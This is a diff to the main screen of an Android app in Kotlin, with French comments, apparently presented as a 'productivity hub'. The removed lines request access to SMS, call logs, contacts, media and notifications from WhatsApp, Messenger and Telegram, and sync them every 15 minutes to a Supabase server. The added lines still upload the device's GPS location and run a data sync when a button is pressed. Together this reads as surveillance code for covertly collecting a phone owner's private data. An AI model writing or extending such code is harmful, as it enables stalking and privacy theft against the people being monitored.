@@ -1,122 +1,74 @@
 package com.axesproductivite.hub
 
 import android.Manifest
-import android.content.Intent
+import android.content.Context
 import android.content.pm.PackageManager
-import android.os.Build
+import android.location.LocationManager
 import android.os.Bundle
-import android.provider.Settings
 import android.widget.Button
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import androidx.work.*
-import java.util.concurrent.TimeUnit
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 class MainActivity : AppCompatActivity() {
 
-    private lateinit var tvNotifStatus : TextView
-    private lateinit var tvStatus      : TextView
-    private lateinit var btnNotifAccess: Button
-    private lateinit var btnSync       : Button
+    private lateinit var tvStatus: TextView
+    private lateinit var btnSync: Button
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
+        // Remplace R.layout.activity_main par le nom exact de ton fichier layout si différent
+        setContentView(R.layout.activity_main) 
 
-        tvNotifStatus  = findViewById(R.id.tvNotifStatus)
-        tvStatus       = findViewById(R.id.tvStatus)
-        btnNotifAccess = findViewById(R.id.btnNotifAccess)
-        btnSync        = findViewById(R.id.btnSync)
+        // Vérifie bien que les IDs correspondent à ton fichier XML (tvStatus et btnSync)
+        tvStatus = findViewById(R.id.tvStatus)
+        btnSync = findViewById(R.id.btnSync)
 
-        // Permissions runtime
-        requestPermissions()
-
-        // Ouvrir le paramètre d'accès aux notifications
-        btnNotifAccess.setOnClickListener {
-            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-        }
-
-        // Sync manuelle
         btnSync.setOnClickListener {
-            sendLocation()
-            tvStatus.text = "⏳ Synchronisation en cours…"
-            WorkManager.getInstance(this)
-                .enqueue(OneTimeWorkRequestBuilder<SyncWorker>().build())
-        }
-
-        // Sync automatique toutes les 15 minutes
-        schedulePeriodic()
-    }
-
-    override fun onResume() {
-        super.onResume()
-        updateUI()
-    }
-
-    private fun updateUI() {
-        val notifOk = isNotificationListenerEnabled()
-        tvNotifStatus.text = if (notifOk)
-            "✅ Accès notifications : ACTIF\n(WhatsApp, Messenger, Telegram…)"
-        else
-            "❌ Accès notifications INACTIF\n→ Appuie sur le bouton ci-dessous"
-
-        btnNotifAccess.isEnabled = !notifOk
-        tvStatus.text = if (notifOk)
-            "Personal Hub actif\nServeur : ${SupabaseClient.SUPABASE_URL}\n\nSync auto toutes les 15 min."
-        else
-            "En attente de l'autorisation de notification…"
-    }
-
-    private fun isNotificationListenerEnabled(): Boolean {
-        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
-        return flat?.contains(packageName) == true
-    }
-
-    private fun requestPermissions() {
-        val base = arrayOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_PHONE_STATE
-        )
-        val media = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
-        else
-            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
-
-        val missing = (base + media).filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }
-        if (missing.isNotEmpty())
-            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
-    }
-
-    private fun schedulePeriodic() {
-        val req = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
-            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
-            .build()
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            "periodic_sync", ExistingPeriodicWorkPolicy.KEEP, req
-        )
-    }
-}
-
-fun sendLocation() {
-    val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
-    try {
-        val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
-            ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
-        if (loc != null) {
-            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-                LocationSync(applicationContext).sync()
+            tvStatus.text = "Synchronisation en cours..."
+            
+            // Lancer la synchronisation des données en arrière-plan
+            CoroutineScope(Dispatchers.IO).launch {
+                // Appel de ton worker de synchronisation
+                SyncWorker(applicationContext).sync()
+                
+                // Mettre à jour l'interface sur le thread principal
+                runOnUiThread {
+                    tvStatus.text = "Synchronisation terminée ✅"
+                }
             }
-            tvStatus.text = "Position envoyée ✅\n${loc.latitude}, ${loc.longitude}"
-        } else {
-            tvStatus.text = "GPS non disponible — Active la localisation"
+            
+            // Envoyer la localisation
+            sendLocation()
         }
-    } catch (e: Exception) {
-        tvStatus.text = "Erreur localisation: ${e.message}"
+    }
+
+    private fun sendLocation() {
+        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            tvStatus.text = "Permission GPS manquante"
+            return
+        }
+        
+        try {
+            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                
+            if (loc != null) {
+                CoroutineScope(Dispatchers.IO).launch {
+                    LocationSync(applicationContext).sync()
+                }
+                tvStatus.text = "Position envoyée ✅\n${loc.latitude}, ${loc.longitude}"
+            } else {
+                tvStatus.text = "GPS non disponible — Active la localisation"
+            }
+        } catch (e: Exception) {
+            tvStatus.text = "Erreur localisation: ${e.message}"
+        }
     }
 }
+
